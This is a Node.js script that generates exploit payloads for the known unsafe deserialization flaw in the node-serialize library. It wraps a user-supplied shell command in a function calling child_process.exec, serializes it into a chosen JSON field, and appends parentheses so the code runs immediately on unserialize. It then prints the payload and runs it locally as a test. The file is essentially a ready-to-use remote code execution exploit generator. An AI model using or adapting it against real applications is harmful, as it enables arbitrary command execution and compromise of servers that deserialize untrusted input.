const s = require('node-serialize')
const { exec } = require('child_process')

// IMPORTANT: To make it work u first ned run the next command:   npm install node-serialize

function help(){
	console.log(`\n\n\t[!] Usage: node ${process.argv[1]} {command_to_execute} {json} {camp_to_insert_IIFE}\n`)
	console.log(`\t Example: node ${process.argv[1]} "whoami" "{'user':'test','password':'test'}" "user"`)
	console.log(`\n\t[+] Output: {'user': IIFE_Function, 'password':'test'}\n\n`)
	exec('exit 1')
}


function testIIFE(cmd){
	console.log("[+] If the IIFE works you'll see your output command down here:\n-----------------------------------------------------\n")
	output = s.unserialize(cmd)
}


command = process.argv[2]
payload = process.argv[3].replaceAll('\'', '"')
vuln_camp = process.argv[4]

if(!command && !payload && !vuln_camp){
	help()
}else{
	payload = JSON.parse(payload)
	payload[vuln_camp] = new Function(`require('child_process').exec('${command}', (err, stdout, stderr) => stdout ? console.log(stdout) : null)`)
	const payload_serialize = s.serialize(payload)
	const final_payload = payload_serialize.replace(': null)\\n}', ': null)\\n}()');
	console.log(`\n\n[!] Here is your IIFE: \n\n${final_payload}\n`)
	testIIFE(final_payload)
}



